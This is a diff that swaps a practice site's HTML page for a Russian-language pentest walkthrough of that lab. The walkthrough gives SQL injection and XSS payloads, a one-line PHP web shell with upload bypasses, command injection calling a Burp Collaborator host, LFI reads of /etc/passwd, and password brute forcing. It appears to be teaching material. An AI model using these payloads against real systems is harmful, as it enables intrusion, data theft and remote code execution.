@@ -1,81 +1,281 @@
-<html>
-  <head>
-    <link rel="stylesheet" href="/css/blueprint/screen.css" type="text/css" media="screen, projection">
-    <link rel="stylesheet" href="/css/blueprint/print.css" type="text/css" media="print">
-    <!--[if IE]><link rel="stylesheet" href="/css/blueprint/ie.css" type="text/css" media="screen, projection"><![endif]-->
-    <link rel="stylesheet" href="/css/stylings.css" type="text/css" media="screen">
-    <title>Second_Lab.com</title>
-  </head>
-  <body>
-    <div class="container " style="border: 2px solid #5c95cf;">
-      <div class="column span-24 first last">
-	<h1 id="title"><a href="/">Second_Lab.com</a></h1>
-      </div>
-      <div id="menu">
-	<div class="column prepend-1 span-14 first">
-	  <ul class="menu">
-	    <li class="current"><a href="/users/home.php"><span>Home</span></a></li>
-	    <li class=""><a href="/pictures/upload.php"><span>Upload</span></a></li>
-	    <li class=""><a href="/pictures/recent.php"><span>Recent</span></a></li>
-            <li class=""><a href="/guestbook.php"><span>Guestbook</span></a></li>
+Подготовка: Настройка Burp Suite
+Установи Burp Suite.
 
-      	  </ul>
-	</div>
-	<div class="column prepend-1 span-7 first last">
-	  <ul class="menu top_login" >
-      	    <li><a href="/users/login.php"><Span>Login</span></a></li>
-      	  </ul>
-	</div>
-      </div>
+Настрой браузер (лучше отдельный, вроде Firefox) на использование прокси Burp: 127.0.0.1 порт 8080.
 
+Установи CA-сертификат Burp в браузер, чтобы ты мог перехватывать HTTPS-трафик (хотя твой сайт, похоже, на HTTP, это хорошая практика).
 
+Включи Proxy -> Intercept is on. Зайди на свой сайт. Burp "поймает" запрос. Изучи его и нажми Forward. Теперь выключи Intercept is off и работай во вкладке HTTP history.
 
-      <div class="column span-24 first last" id="search_bar_blue">
-	<div class="column prepend-17 span-7 first last" id="search_box">
-	  <form action="/pictures/search.php" method="get" style="display:inline;">
-	    <input id="query2" name="query" size="15" style="padding: 2px; font-size: 16px; text-decoration:none;border:none;vertical-align:middle;" type="text" value=""/>
-	    <input src="/images/search_button_white.gif" type="image" style="border: 0pt none ; position: relative; top: 0px;vertical-align:middle;margin-left: 1em;" />
-	  </form>
-	</div>
-      </div>
-   
+Шаг 1: Тестирование SQL-инъекций (SQLi)
+Здесь мы проверяем, вставляются ли наши данные напрямую в SQL-запрос.
 
-<div class="column prepend-1 span-24 first last">
-  <h2>Welcome to Second_Lab</h2>
-  <p>
-    On Second_Lab, you can share all your crazy pics with your friends. <br />
-    But that's not all, you can also buy the rights to the high quality <br />
-    version of someone's pictures. Second_Lab is fun for the whole family.
-  </p>
+Цели: #1 (Поиск), #2 (Профиль).
 
-  <h3>New Here?</h3>
-  <p>
-    <h4><a href="/users/register.php">Create an account</a></h4>
-  </p>
-  <p>
-    <h4><a href="/users/sample.php?userid=1">Check out a sample user!</a></h4>
-  </p>
-  <p>
-    <h4><a href="/calendar.php">What is going on today?</a></h4>
-  </p>
-  <p>
-    <h4>Or you can test to see if Second_Lab can handle a file:</h4> <br />
-  <script>
-    document.write('<form enctype="multipart/form-data" action="/pic' + 'check' + '.php" method="POST"><input type="hidden" name="MAX_FILE_SIZE" value="30000" />Check this file: <input name="userfile" type="file" /> <br />With this name: <input name="name" type="text" /> <br /> <br /><input type="submit" value="Send File" /><br /> </form>');
-  </script>
-  </p>
-</div>
+A. Поиск (/pictures/search.php)
+Ручной тест (Error-based):
 
+Введи в поле поиска один апостроф: '.
 
-       <div class="column span-24 first last" id="footer" >
-	<ul>
-	  <li><a href="/">Home</a> |</li>
-          <li><a href="/admin/index.php?page=login">Admin</a> |</li>
-	  <li><a href="mailto:contact@secondlab.com">Contact</a> |</li>
-	  <li><a href="/tos.php">Terms of Service</a></li>
-	</ul>
-      </div>
-    </div>
-  </body>
-</html>
-   
+Что искать: Ошибку базы данных на странице. Что-то вроде: You have an error in your SQL syntax near ''' at line 1. Это 100% подтверждение.
+
+Ручной тест (Boolean-based):
+
+Введи в поиск: a' OR '1'='1.
+
+Что искать: Страница должна вернуть все картинки, которые есть в базе данных, потому что OR '1'='1 всегда истинно.
+
+Ручной тест (Time-based):
+
+Введи: a' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--.
+
+Что искать: Страница должна загружаться ровно на 5 секунд дольше обычного. Это "слепая" инъекция.
+
+Автоматизированный тест:
+
+Используй sqlmap (если он у тебя есть):
+
+Bash
+
+sqlmap -u "http://second_lab.com/pictures/search.php?query=test" --batch
+B. Профиль пользователя (/users/sample.php)
+Перейди по ссылке /users/sample.php?userid=1.
+
+Повтори те же тесты, что и в поиске, но изменяя параметр userid в URL:
+
+Error-based: .../sample.php?userid=1'
+
+Boolean-based: .../sample.php?userid=1 OR 1=1
+
+Time-based: .../sample.php?userid=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)
+
+Что искать: Те же самые признаки — ошибки, лишние данные или задержка ответа.
+
+Шаг 2: Тестирование XSS (Межсайтовый скриптинг)
+Здесь мы проверяем, выполняет ли браузер наш код, вставленный на страницу.
+
+Цели: #3 (Guestbook), #4 (Имя файла), #5 (Поиск).
+
+A. Reflected XSS (Поиск)
+Введи в поле поиска: <script>alert('XSS1')</script>.
+
+Нажми "Поиск".
+
+Что искать: Всплывающее окно (alert) с текстом "XSS1".
+
+Если не сработало: Сервер может фильтровать <script>. Попробуй другие векторы:
+
+<img src=x onerror=alert('XSS2')>
+
+<svg onload=alert('XSS3')>
+
+B. Stored XSS (Гостевая книга)
+Перейди на /guestbook.php.
+
+В поле для имени или сообщения введи: <script>alert('Guestbook XSS')</script>.
+
+Отправь форму.
+
+Что искать:
+
+Окно alert должно появиться сразу после отправки.
+
+Важно: Обнови страницу (F5). Окно должно появиться снова.
+
+Зайди на страницу гостевой книги из другого браузера. Окно должно появиться и там. Это доказывает, что XSS хранимый (Stored).
+
+C. Stored XSS (Имя файла)
+Перейди к форме загрузки файла (которая генерируется JS).
+
+Выбери любой маленький файл (например, .txt или .jpg).
+
+В поле With this name: введи: <img src=x onerror=alert('File XSS')>.jpg.
+
+Нажми Send File.
+
+Что искать: Перейди на страницу, где отображаются последние загруженные файлы (вероятно, /pictures/recent.php). Если твой alert сработает при загрузке той страницы, ты нашел Stored XSS.
+
+Шаг 3: Тестирование уязвимостей загрузки файлов
+Здесь мы проверяем, насколько "умно" сервер обрабатывает загружаемые файлы.
+
+Цели: #6 (OS Command Injection), #7 (File Upload), #8 (Обход MAX_FILE_SIZE).
+
+A. Обход MAX_FILE_SIZE
+Найди файл размером > 30000 байт (например, 50КБ).
+
+Попробуй загрузить его. Браузер, скорее всего, сразу выдаст ошибку, даже не отправив запрос.
+
+Обход:
+
+Включи Burp Proxy (Intercept is on).
+
+Загрузи валидный маленький файл (1КБ).
+
+Burp перехватит POST запрос.
+
+В окне Burp найди и удали строку MAX_FILE_SIZE=30000.
+
+Нажми Forward.
+
+Что искать: Если сервер не имеет собственной проверки на стороне сервера, он примет файл.
+
+B. Загрузка веб-шелла (RCE) ☣️
+Создай файл shell.php с таким содержимым: <?php echo system($_GET['cmd']); ?>
+
+Попытка 1: Попробуй загрузить shell.php.
+
+Что искать: Ошибку "Invalid file type" или "Only images allowed".
+
+Попытка 2 (Обход расширения): Переименуй файл и попробуй загрузить: shell.php.jpg (если сервер проверяет только последнее расширение) или shell.phtml (если сервер настроен на выполнение .phtml как PHP).
+
+Попытка 3 (Обход MIME-типа):
+
+Попробуй загрузить shell.php.
+
+Перехвати запрос в Burp.
+
+Найди строку Content-Type: application/x-php.
+
+Измени ее на: Content-Type: image/jpeg.
+
+Нажми Forward.
+
+Если успешно: Сайт, вероятно, скажет, куда загружен файл (например, /uploads/shell.php). Перейди по URL http://second_lab.com/uploads/shell.php?cmd=whoami.
+
+Что искать: Текст www-data или имя пользователя, от которого запущен веб-сервер, на странице.
+
+C. Инъекция OS-команд (Blind)
+Это тест на "слепую" инъекцию через поле name.
+
+Тест на задержку:
+
+Загрузи валидный файл.
+
+В поле name введи: test.jpg; sleep 10.
+
+Что искать: Запрос должен "зависнуть" и выполняться ровно 10 секунд.
+
+Тест с Burp Collaborator (Out-of-Band):
+
+Открой в Burp: Burp -> Burp Collaborator Client. Скопируй уникальный URL (например, xyz.burpcollaborator.net).
+
+В поле name введи: test.jpg; nslookup xyz.burpcollaborator.net (для Linux/Windows) или test.jpg; curl http://xyz.burpcollaborator.net (для Linux).
+
+Нажми Send File.
+
+Что искать: В окне Burp Collaborator нажми Poll now. Ты должен увидеть DNS или HTTP запрос от сервера. Это доказывает выполнение команды.
+
+Шаг 4: Тестирование LFI и IDOR
+Здесь мы проверяем, можем ли мы получить доступ к чужим данным или файлам сервера.
+
+Цели: #9 (LFI), #11 (IDOR).
+
+A. Local File Inclusion (LFI)
+Перейди на /admin/index.php?page=login.
+
+Тест 1 (Чтение файла): В URL измени page=login на:
+
+page=../../../../../../etc/passwd
+
+Что искать: Содержимое файла /etc/passwd на странице.
+
+Тест 2 (Обход фильтрации): Если Тест 1 не сработал (сервер может добавлять .php в конце), попробуй .../admin/index.php?page=../../../../../../etc/passwd%00 (это null-байт, работает на старых версиях PHP).
+
+Тест 3 (Чтение исходного кода): Попробуй использовать PHP-фильтр:
+
+page=php://filter/convert.base64-encode/resource=login
+
+Что искать: Длинную строку в Base64. Скопируй ее, декодируй (используй онлайн-декодер) и посмотри — ты должен увидеть исходный код файла login.php.
+
+B. IDOR (Insecure Direct Object Reference)
+Перейди по ссылке /users/sample.php?userid=1.
+
+Тест: Просто измени userid=1 на userid=2 в URL.
+
+Что искать: Если загрузится профиль другого пользователя (даже если его не существует, но ошибка "user not found" отличается от "access denied"), это IDOR. Попробуй перебрать ID (1, 2, 3...).
+
+Шаг 5: Контроль доступа и Брутфорс
+Здесь мы проверяем "двери" и "замки" сайта.
+
+Цели: #12 (Админ-панель), #13 (Сломанный доступ), #16 (Брутфорс).
+
+A. Проверка доступа (Broken Access Control)
+Выйди из системы (если был залогинен).
+
+Попробуй напрямую открыть в браузере URL-адреса, которые должны быть доступны только залогиненным пользователям:
+
+/pictures/upload.php
+
+/admin/index.php (без ?page=login)
+
+Что искать: Если страница загружается, а не перекидывает тебя на /users/login.php, то это уязвимость "Missing Function Level Access Control".
+
+B. Брутфорс логина
+Перейди на /users/login.php.
+
+Включи Burp Proxy (Intercept is on).
+
+Попробуй войти с логином admin и паролем password.
+
+Перехвати POST запрос в Burp.
+
+Правой кнопкой мыши -> Send to Intruder.
+
+В Intruder -> Positions. Нажми Clear §.
+
+Выдели только значение пароля (т.е. password) и нажми Add §.
+
+Перейди во вкладку Payloads. В Payload Options [Simple list] добавь 10-20 распространенных паролей:
+
+admin
+
+123456
+
+password
+
+qwerty
+
+root
+
+Нажми Start Attack.
+
+Что искать: В окне результатов смотри на колонку Length (Длина ответа). Если одна из попыток вернет другую длину (или другой Status код, например 302 вместо 200), этот пароль, скорее всего, подошел.
+
+Шаг 6: Прочие уязвимости
+Цели: #14 (CSRF), #15 (Info Disclosure), #17 (HTTP).
+
+CSRF (Cross-Site Request Forgery):
+
+Зайди в свой аккаунт.
+
+Перейди в Guestbook.
+
+Отправь тестовое сообщение (test-csrf).
+
+Найди этот POST запрос в Burp -> HTTP History.
+
+Правой кнопкой мыши -> Engagement tools -> Generate CSRF PoC.
+
+Скопируй HTML, сохрани его как test.html и открой в том же браузере, где ты залогинен.
+
+Нажми кнопку "Submit request" на этой test.html странице.
+
+Что искать: Вернись на сайт в гостевую книгу. Если там появилось второе сообщение test-csrf, значит, сайт уязвим к CSRF (он не проверяет, откуда пришел запрос).
+
+Раскрытие информации:
+
+Просмотр исходного кода: На каждой странице (Ctrl+U). Ищи HTML-комментарии ``.
+
+Просмотр CSS/JS: Открой все .css и .js файлы, на которые ссылается head. Ищи в них комментарии /* ... */.
+
+Вызов ошибок: Во всех тестах на SQLi (#1, #2) и LFI (#9) внимательно читай сообщения об ошибках. Они могут раскрыть полные пути на сервере (например, Warning: include failed in /var/www/html/admin/index.php on line 10), версии ПО и т.д.
+
+HTTP / Отсутствие HSTS:
+
+Посмотри на URL в браузере. Он http:// или https://?
+
+Что искать: Если http://, значит, трафик (включая пароли) идет в незашифрованном виде. Это уязвимость "Cleartext Transmission".
+
+Открой Dev Tools (F12) -> Network. Обнови страницу. Нажми на главный запрос (к second_lab.com). Посмотри Response Headers.
+
+Что искать: Отсутствие хедера Strict-Transport-Security.
